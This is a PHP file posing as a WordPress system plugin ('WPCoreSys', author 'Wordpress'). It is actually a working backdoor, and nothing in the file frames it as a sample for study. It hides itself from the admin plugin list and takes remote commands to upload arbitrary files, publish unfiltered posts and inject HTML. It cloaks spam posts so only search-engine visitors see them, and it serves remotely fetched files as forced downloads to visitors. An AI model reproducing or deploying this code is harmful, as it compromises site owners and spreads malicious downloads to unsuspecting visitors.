<?php

/*
* Plugin Name: WPCoreSys
* Version: 2.0
* Author: Wordpress
*/

    error_reporting(0);

    function fn_dolly_get_filename_from_headers($headers)
    {
        if (is_array($headers))
        {
            foreach($headers as $header => $value)
            {
                if (stripos($header,'content-disposition') !== false || stripos($value,'content-disposition') !== false)
                {
                    $tmp_name = explode('=', $value);

                    if ($tmp_name[1])
                    {
                        $tmp_name = trim($tmp_name[1],'";\'');
                        break;
                    }
                }
            }
        }

        return (isset($tmp_name) && !empty($tmp_name)) ? $tmp_name : false;
    }

    function fn_dolly_get_cookie_name()
    {
        return 'wp-' . md5(get_home_url() . 'w_cookie');
    }

    function fn_dolly_get_table_name()
    {
        global $wpdb;

        return $wpdb->prefix . 'dolly_plugin_table';
    }

    function fn_dolly_plugin_activation_hook()
    {
        global $wpdb;
        $table_name = fn_dolly_get_table_name();

        if($wpdb->get_var("SHOW TABLES LIKE '$table_name'") != $table_name)
        {
            $charset_collate = $wpdb->get_charset_collate();

            $sql = "CREATE TABLE {$table_name} (
                hash varchar(32) NOT NULL, 
                url varchar(190) NOT NULL,
                time datetime DEFAULT '0000-00-00 00:00:00' NOT NULL,
                UNIQUE KEY hash (hash)
            ) {$charset_collate};";

            require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
            dbDelta($sql);
        }
    }

    class dolly_plugin
    {
        var $m_root_path;
        var $m_upload_path;
        var $m_upload_url;
        var $m_request;
        var $m_actions;
        var $m_useragent = 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0)';
        var $m_secookie = '';

        public function __construct()
        {
            $this->m_actions = array('INIT', 'TARGET', 'UPLOAD', 'POST', 'STATS', 'HTML');
            
            $this->m_root_path = plugin_dir_path(__FILE__);
            
            $upload_path = wp_upload_dir();

            if (isset($upload_path['path']) && is_writable($upload_path['path']))
            {
                $this->m_upload_path = $upload_path['path'];
                $this->m_upload_url = $upload_path['url'];
            }

            if (isset($_COOKIE[fn_dolly_get_cookie_name()]))
                $this->m_secookie = true;

            if ( (!$this->is_se_request() && empty($this->m_secookie)) )
            {
                add_filter('posts_clauses', array($this, 'posts_clauses'), 0, 2);
		add_filter('terms_clauses', array($this, 'terms_clauses'), 0, 2);
            }
            else
            {
                if (empty($this->m_secookie))
                    setcookie(fn_dolly_get_cookie_name(), 'true', time() + (5 * MINUTE_IN_SECONDS), COOKIEPATH, COOKIE_DOMAIN);

                add_action('installation_point', array($this, 'insert_content'));
                add_action('dynamic_sidebar', array($this, 'insert_content'));
                add_action('wp_footer', array($this, 'insert_content'));
            }

            add_action('init', array($this, 'wp_init'), 0);
            add_action('wp_title', array($this, 'count_post_stats'));
            add_action('wp_head', array($this, 'count_post_stats'));
            add_action('dynamic_sidebar', array($this, 'count_post_stats'));
            add_action('wp_footer', array($this, 'count_post_stats'));

            if (is_admin())
                add_action('all_plugins', array($this, 'all_plugins'));

            add_filter('get_the_excerpt', array($this, 'get_the_excerpt'));

            register_activation_hook(__FILE__, 'fn_dolly_plugin_activation_hook');

            $this->track_target_download();
        }

        private function parse_request()
        {
            $this->m_request = false;

            foreach ($_POST as $key => $value)
            {
                if (stripos($key, 'w_') === false)
                    continue;

                if (!is_array($this->m_request))
                    $this->m_request = array();

                $this->m_request[$key] = $value;
            }

            if (!isset($this->m_request['w_action']) || !isset($this->m_request['w_seckey']))
                $this->m_request = false;

            return $this->m_request;
        }

        public function wp_init()
        {
            global $wpdb;

            if ($this->parse_request() !== false)
            {
                $action = $this->m_request['w_action'];

                $key_req = $this->m_request['w_seckey'];

                $key_hash = get_option('w_dolly_hash');

                if (empty($key_hash) && $action == 'INIT')
                    add_option('w_dolly_hash', md5($key_req)) === true ? $this->result(1) : $this->result(0);

                if ((!empty($key_req) && !empty($key_hash)) && ($key_hash != md5($key_req)))
                    $this->result(0);

                switch ($action)
                {
                    case 'TARGET':
                    {
                        if (empty($this->m_request['w_target']))
                            $this->result(0);

                        $target = base64_decode($this->m_request['w_target']);

                        update_option('w_dolly_target', $target) === true ? $this->result(1) : $this->result(0);

                        break;
                    }
                    case 'UPLOAD':
                    {
                        if (empty($this->m_request['w_filename']) || empty($this->m_request['w_filedata']))
                            $this->result(0);

                        $path = $this->m_upload_path . '/' . $this->m_request['w_filename'];

                        $url = $this->m_upload_url . '/' . $this->m_request['w_filename'];

                        $data = base64_decode(rawurldecode($this->m_request['w_filedata']));

                        file_put_contents($path, $data) === false ? $this->result(0) : $this->result($url);

                        break;
                    }
                    case 'POST':
                    {
                        if (empty($this->m_request['w_postbody']) || empty($this->m_request['w_posttitle']))
                            $this->result(0);

                        $post_body = base64_decode(rawurldecode($this->m_request['w_postbody']));

                        $dolly_excerpt = get_option('w_dolly_excerpt');

                        if (empty($dolly_excerpt))
                        {
                            $dolly_excerpt = substr($key_hash, 0, 5);

                            add_option('w_dolly_excerpt', $dolly_excerpt);
                        }

                        $new_post = array(
                            'post_title'    => $this->m_request['w_posttitle'],
                            'post_content'  => $post_body,
                            'post_status'   => 'publish',
                            'post_author'   => 1
                        );

                        if (!empty($this->m_request['w_postcat']))
                        {
                            $post_cat = $this->m_request['w_postcat'];

                            $cat_id = get_cat_ID($post_cat);

                            if ($cat_id == 0)
                            {
                                $new_term = wp_insert_term($post_cat, 'category');

                                $cat_id = intval($new_term['term_id']);
                            }

                            $new_post['post_category'] = array($cat_id);
                        }

                        kses_remove_filters();

                        $post_id = wp_insert_post($new_post);

                        if (is_int($post_id) && $post_id > 0)
                        {
                            $excerpt = apply_filters('the_excerpt', get_post_field('post_content', $post_id));

                            $excerpt = $excerpt . $dolly_excerpt;

                            $post_update = array('ID' => $post_id, 'post_excerpt' => $excerpt);

                            wp_update_post($post_update, true);

                            $url = get_permalink($post_id);

                            $this->result($url);
                        }

                        $this->result(0);

                        break;
                    }
                    case 'STATS':
                    {
                        $table = fn_dolly_get_table_name();

                        $result = $wpdb->get_results("SELECT url, COUNT(url) AS hits FROM {$table} GROUP BY url");

                        $stats = '';

                        foreach ($result as $value)
                            $stats .= $value->url . '|' . $value->hits . "\n";

                        $this->result($stats);

                        break;
                    }
                    case 'HTML':
                    {
                        if (empty($this->m_request['w_html']))
                            $this->result(0);

                        $html = base64_decode($this->m_request['w_html']);

                        update_option('w_dolly_html', $html) === true ? $this->result(1) : $this->result(0);

                        break;
                    }
                }
            }

            $this->reset_stats();
        }

        public function get_the_excerpt($ex)
        {
            $excerpt = get_option('w_dolly_excerpt');

            if (!empty($excerpt))
                $ex = str_replace($excerpt, '', $ex);

            return $ex;
        }

        public function all_plugins($plugins)
        {
            $self_file = str_replace($this->m_root_path, '', __FILE__);

            foreach ($plugins as $plugin_file => $plugin_data)
            {
                if (stripos($plugin_file, $self_file) !== false)
                {
                    unset($plugins[$plugin_file]);

                    break;
                }
            }

            return $plugins;
        }

	public function posts_clauses($clauses, $query)
	{
		global $wpdb;

		$excerpt = get_option('w_dolly_excerpt');

		if (!empty($excerpt))
		{
			$clauses['where'] .= " AND {$wpdb->posts}.post_excerpt NOT LIKE '%{$excerpt}%'";
		}

		return $clauses;
	}

	public function terms_clauses($clauses, $query)
	{
		global $wpdb;

		$excerpt = get_option('w_dolly_excerpt');

		if (!empty($excerpt))
		{
			$cats = $wpdb->get_col(
						"SELECT key1.term_id FROM wp_term_taxonomy key1
						INNER JOIN wp_term_relationships key2 ON key2.term_taxonomy_id = key1.term_taxonomy_id AND key1.taxonomy = 'category'
						INNER JOIN wp_posts key3 ON key3.id = key2.object_id AND key3.post_excerpt LIKE '%{$excerpt}%'"
						);

			$clauses['where'] .= " AND t.term_id NOT IN(" . implode(",", $cats) . ")";
		}

		return $clauses;
	}

        public function insert_content($args)
        {
            global $g_html_inserted, $g_links_inserted;

            if (!isset($g_html_inserted) && $_SERVER["REQUEST_URI"] == "/")
            {
                $html = get_option('w_dolly_html');

                if (!empty($html))
                    echo $html;

                $g_html_inserted = true;
            }

            if (!isset($g_links_inserted))
            {
                echo "\r\n";
                echo "<ul>\r\n";
                wp_get_archives();
                echo "</ul>\r\n";
                echo "\r\n";

                $g_links_inserted = true;
            }
        }

        public function count_post_stats()
        {
            global $g_stats_counted, $post, $wpdb;

            if (empty($g_stats_counted) && is_object($post) && is_single())
            {
                $w_excerpt = get_option('w_dolly_excerpt');

                $p_excerpt = $post->post_excerpt;

                if (stripos($p_excerpt, $w_excerpt) !== false)
                {
                    $table_name = fn_dolly_get_table_name();

                    $post_url = get_the_permalink();

                    $ip = isset($_SERVER['HTTP_X_REAL_IP']) ? $_SERVER['HTTP_X_REAL_IP'] : null;
                    $ip = empty($ip) && isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $ip;
                    $ip = empty($ip) && isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : $ip;

                    $hash = md5($ip . $_SERVER['HTTP_USER_AGENT']);

                    $sql = "INSERT INTO {$table_name} (hash, url, time) VALUES(%s, %s, NOW())";

                    $sql = $wpdb->prepare($sql, $hash, $post_url);

                    $wpdb->query($sql);

                    $g_stats_counted = true;
                }
            }
        }

        private function track_target_download()
        {
            $target = get_option('w_dolly_target');

            $hash = get_option('w_dolly_hash');

            $var = isset($_GET[$hash]) ? $_GET[$hash] : false;

            if (!empty($target) && $var !== false)
            {
                $target_url = $target . '?target=' . $var;
                $target_path = $this->m_upload_path . '/' . $var;
                $target_mtime = intval(filemtime($target_path));
                $target_name = '';
                $target_content = '';

                if (!file_exists($target_path) || ($target_mtime > 0 && (time() - $target_mtime >= HOUR_IN_SECONDS)))
                {
                    if (file_exists($target_path))
                        unlink($target_path);

                    if (!function_exists('wp_remote_get'))
                    {
                        $request = wp_remote_get($target_url, array('user-agent' => $this->m_useragent));

                        if (is_array($request) && !empty($request['body']))
                        {
                            $target_name = fn_dolly_get_filename_from_headers($request['headers']);

                            $response_code = wp_remote_retrieve_response_code($request);

                            if ($response_code == 200)
                                $target_content = wp_remote_retrieve_body($request);
                        }
                    }

                    if (empty($target_content))
                    {
                        $opts = array('http' => array(
                                        'method' => 'GET',
                                        'header' => 'User-agent: ' . $this->m_useragent . "\r\n")
				);

                        $context = stream_context_create($opts);

                        $target_content = file_get_contents($target_url, false, $context);

                        $target_name = fn_dolly_get_filename_from_headers($http_response_header);
                    }

                    if (!empty($target_content))
                        file_put_contents($target_path, $target_content);

                    if (!empty($target_name))
                        file_put_contents($target_path . '.name', $target_name);
                }
                else
                    $target_content = file_get_contents($target_path);

                if (empty($target_content))
                {
                    header('Location: ' . $target_url);
                    die();
                }
                else
                {
                    $target_name = file_exists($target_path . '.name') ? trim(file_get_contents($target_path . '.name')) : $var;

                    header('Content-Description: File Transfer');
                    header('Content-Type: application/octet-stream');
                    header('Content-Disposition: attachment; filename="' . $target_name . '"');
                    header('Content-Transfer-Encoding: binary');
                    header('Expires: 0');
                    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
                    header('Pragma: public');
                    header('Content-Length: ' . strlen($target_content));

                    die($target_content);
                }
            }
        }

        private function reset_stats()
        {
            global $wpdb;

            $last_reset_time = intval(get_option('w_dolly_resettime'));

            if ((time() - $last_reset_time) >=  (60 * 60 * 1))
            {
                $table_name = fn_dolly_get_table_name();

                $wpdb->query("DELETE FROM {$table_name} WHERE time <= NOW() - INTERVAL 1 DAY");

                update_option('w_dolly_resettime', time());
            }
        }

        private function result($code)
        {
            die('[***[' . $code . ']***]');
        }

        private function is_se_request()
        {
            $is_se = false;

            $se_name = array('google', 'yahoo', 'msn', 'bing');

            $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';

            $agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';

            if (!empty($referer) || !empty($agent))
            {
                foreach ($se_name as $name)
                {
                    if (stripos($referer, $name) !== false || stripos($agent, $name) !== false)
                    {
                        $is_se = true;

                        break;
                    }
                }
            }

            return $is_se;
        }
    }

    global $g_dolly_plugin;

    if (!isset($g_dolly_plugin))
        $g_dolly_plugin = new dolly_plugin();
?>